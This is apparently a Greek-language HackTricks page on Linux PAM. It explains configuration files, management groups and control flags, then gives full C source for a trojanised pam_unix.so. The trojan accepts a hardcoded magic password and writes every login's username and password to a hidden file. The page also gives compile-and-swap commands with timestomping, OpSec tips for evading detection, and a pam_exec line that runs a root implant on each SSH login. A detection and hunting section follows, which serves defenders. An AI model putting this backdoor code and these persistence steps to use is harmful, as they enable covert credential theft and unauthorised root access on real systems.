# PAM - Pluggable Authentication Modules

{{#include ../../banners/hacktricks-training.md}}

### Βασικές Πληροφορίες

**PAM (Pluggable Authentication Modules)** λειτουργεί ως μηχανισμός ασφαλείας που **επαληθεύει την ταυτότητα των χρηστών που επιχειρούν να αποκτήσουν πρόσβαση σε υπηρεσίες υπολογιστή**, ελέγχοντας την πρόσβασή τους με βάση διάφορα κριτήρια. Είναι σαν ένας ψηφιακός φύλακας πύλης, διασφαλίζοντας ότι μόνο εξουσιοδοτημένοι χρήστες μπορούν να χρησιμοποιούν συγκεκριμένες υπηρεσίες ενώ ενδεχομένως περιορίζει τη χρήση τους για να αποτρέψει την υπερφόρτωση του συστήματος.

#### Αρχεία Διαμόρφωσης

- **Solaris and UNIX-based systems** συνήθως χρησιμοποιούν ένα κεντρικό αρχείο ρυθμίσεων που βρίσκεται στο `/etc/pam.conf`.
- **Linux systems** προτιμούν μία προσέγγιση με κατάλογο, αποθηκεύοντας ρυθμίσεις ανά υπηρεσία στο `/etc/pam.d`. Για παράδειγμα, το αρχείο ρυθμίσεων για την υπηρεσία login βρίσκεται στο `/etc/pam.d/login`.

Ένα παράδειγμα ρυθμίσεων PAM για την υπηρεσία login μπορεί να μοιάζει έτσι:
```
auth required /lib/security/pam_securetty.so
auth required /lib/security/pam_nologin.so
auth sufficient /lib/security/pam_ldap.so
auth required /lib/security/pam_unix_auth.so try_first_pass
account sufficient /lib/security/pam_ldap.so
account required /lib/security/pam_unix_acct.so
password required /lib/security/pam_cracklib.so
password required /lib/security/pam_ldap.so
password required /lib/security/pam_pwdb.so use_first_pass
session required /lib/security/pam_unix_session.so
```
#### **PAM Περιοχές Διαχείρισης**

Αυτές οι περιοχές, ή ομάδες διαχείρισης, περιλαμβάνουν **auth**, **account**, **password**, και **session**, η κάθε μία υπεύθυνη για διαφορετικές πτυχές της διαδικασίας επαλήθευσης ταυτότητας και διαχείρισης συνεδρίας:

- **Auth**: Επαληθεύει την ταυτότητα του χρήστη, συχνά ζητώντας κωδικό πρόσβασης.
- **Account**: Χειρίζεται την επαλήθευση του λογαριασμού, ελέγχοντας προϋποθέσεις όπως ιδιότητα μέλους ομάδας ή περιορισμούς ανά ώρα της ημέρας.
- **Password**: Διαχειρίζεται ενημερώσεις κωδικών, περιλαμβάνοντας ελέγχους πολυπλοκότητας ή πρόληψη επιθέσεων λεξικού.
- **Session**: Διαχειρίζεται ενέργειες κατά την έναρξη ή λήξη μιας συνεδρίας υπηρεσίας, όπως η προσάρτηση καταλόγων ή ο καθορισμός ορίων πόρων.

#### **PAM Module Controls**

Οι έλεγχοι καθορίζουν την αντίδραση της module σε επιτυχία ή αποτυχία, επηρεάζοντας τη συνολική διαδικασία επαλήθευσης. Αυτοί περιλαμβάνουν:

- **Required**: Η αποτυχία μιας Required module έχει ως αποτέλεσμα τελική αποτυχία, αλλά μόνο αφού ελεγχθούν όλες οι επόμενες modules.
- **Requisite**: Άμεση διακοπή της διαδικασίας σε περίπτωση αποτυχίας.
- **Sufficient**: Η επιτυχία παρακάμπτει τους υπόλοιπους ελέγχους της ίδιας περιοχής, εκτός αν κάποια μετέπειτα module αποτύχει.
- **Optional**: Προκαλεί αποτυχία μόνο αν είναι η μόνη module στη στοίβα.

#### Example Scenario

Σε μια ρύθμιση με πολλαπλές auth modules, η διαδικασία ακολουθεί αυστηρή σειρά. Αν το `pam_securetty` module βρει ότι το τερματικό σύνδεσης δεν είναι εξουσιοδοτημένο, οι root συνδέσεις μπλοκάρονται, ωστόσο όλες οι modules εξακολουθούν να εκτελούνται λόγω της "required" κατάστασής του. Το `pam_env` ορίζει μεταβλητές περιβάλλοντος, βελτιώνοντας ενδεχομένως την εμπειρία χρήστη. Τα `pam_ldap` και `pam_unix` modules συνεργάζονται για να επαληθεύσουν τον χρήστη, με το `pam_unix` να προσπαθεί να χρησιμοποιήσει έναν προηγουμένως δοθέντα κωδικό, αυξάνοντας την αποδοτικότητα και την ευελιξία στις μεθόδους επαλήθευσης.


## Backdooring PAM – Hooking `pam_unix.so`

Ένα κλασικό persistence trick σε περιβάλλοντα Linux υψηλής αξίας είναι να αντικαταστήσετε τη νόμιμη βιβλιοθήκη PAM με ένα trojanised drop-in. Επειδή κάθε SSH / console login καλεί τελικά `pam_unix.so:pam_sm_authenticate()`, λίγες γραμμές σε C αρκούν για να καταγράψουν διαπιστευτήρια ή να υλοποιήσουν ένα *magic* password bypass.

### Cheatsheet Μεταγλώττισης
<details>
<summary>Δείγμα `pam_unix.so` trojan</summary>
```c
#define _GNU_SOURCE
#include <security/pam_modules.h>
#include <dlfcn.h>
#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>

static int (*orig)(pam_handle_t *, int, int, const char **);
static const char *MAGIC = "Sup3rS3cret!";

int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv) {
const char *user, *pass;
pam_get_user(pamh, &user, NULL);
pam_get_authtok(pamh, PAM_AUTHTOK, &pass, NULL);

/* Magic pwd → immediate success */
if(pass && strcmp(pass, MAGIC) == 0) return PAM_SUCCESS;

/* Credential harvesting */
int fd = open("/usr/bin/.dbus.log", O_WRONLY|O_APPEND|O_CREAT, 0600);
dprintf(fd, "%s:%s\n", user, pass);
close(fd);

/* Fall back to original function */
if(!orig) {
orig = dlsym(RTLD_NEXT, "pam_sm_authenticate");
}
return orig(pamh, flags, argc, argv);
}
```
</details>

Μεταγλωττίστε και αντικαταστήστε κρυφά:
```bash
gcc -fPIC -shared -o pam_unix.so trojan_pam.c -ldl -lpam
mv /lib/security/pam_unix.so /lib/security/pam_unix.so.bak
mv pam_unix.so /lib/security/pam_unix.so
chmod 644 /lib/security/pam_unix.so     # keep original perms
touch -r /bin/ls /lib/security/pam_unix.so  # timestomp
```
### OpSec Συμβουλές
1. **Atomic overwrite** – γράψτε σε ένα προσωρινό αρχείο και `mv` στη θέση του για να αποφύγετε ημιτελείς βιβλιοθήκες που θα κλειδώσουν την πρόσβαση SSH.
2. Η τοποθέτηση αρχείου καταγραφής όπως `/usr/bin/.dbus.log` συγχέεται με νόμιμα στοιχεία της επιφάνειας εργασίας.
3. Διατηρήστε τις εξαγωγές συμβόλων ταυτόσημες (`pam_sm_setcred`, κ.λπ.) για να αποφύγετε μη αναμενόμενη συμπεριφορά του PAM.

### Ανίχνευση
* Συγκρίνετε τα MD5/SHA256 του `pam_unix.so` με το πακέτο της διανομής.
* `rpm -V pam` ή `debsums -s libpam-modules` για να εντοπίσετε αντικαταστημένες βιβλιοθήκες χωρίς χειροκίνητο hashing.
* Ελέγξτε για world-writable ή ασυνήθη ιδιοκτησία κάτω από `/lib/security/`.
* `auditd` κανόνας: `-w /lib/security/pam_unix.so -p wa -k pam-backdoor`.
* Ψάξτε τις ρυθμίσεις PAM για μη αναμενόμενα modules: `grep -R "pam_[a-z].*\.so" /etc/pam.d/ | grep -v pam_unix`.

### Γρήγορες εντολές για αρχικό έλεγχο (post-compromise or threat hunting)
```bash
# 1) Spot alien PAM objects
find /{lib,usr/lib,usr/local/lib}{,64}/security -type f -printf '%p %s %M %u:%g %TY-%Tm-%Td\n' | grep -E 'pam_|libselinux'

# 2) Verify package integrity
command -v rpm >/dev/null && rpm -V pam || debsums -s libpam-modules

# 3) Identify non-packaged PAM modules
for f in /{lib,usr/lib,usr/local/lib}{,64}/security/*.so; do
dpkg -S "$f" >/dev/null 2>&1 || echo "UNPACKAGED: $f";
done

# 4) Look for stealth config edits
grep -R "pam_.*\.so" /etc/pam.d/ | grep -E 'plg|selinux|custom|exec'
```
### Κατάχρηση `pam_exec` για persistence
Αντί να αντικαταστήσετε το `pam_unix.so`, μια πιο ελαφριά προσέγγιση είναι να προσθέσετε μια γραμμή `pam_exec` στο `/etc/pam.d/sshd` έτσι ώστε κάθε SSH login να εκκινεί ένα implant, αφήνοντας την κανονική στοίβα ανέπαφη:
```bash
# Prepend to /etc/pam.d/sshd
session optional pam_exec.so quiet /usr/local/bin/.ssh_hook.sh
```
`pam_exec` τρέχει ως root μέσα στο sshd PAM context, οπότε το script μπορεί να ρίξει reverse shells, να συλλέξει env vars, ή να ξανανοίξει implanted sockets χωρίς αλλαγές στο filesystem ή στα core libraries.


## Αναφορές

- [https://hotpotato.tistory.com/434](https://hotpotato.tistory.com/434)
- [Palo Alto Unit42 – Infiltration of Global Telecom Networks](https://unit42.paloaltonetworks.com/infiltration-of-global-telecom-networks/)

{{#include ../../banners/hacktricks-training.md}}
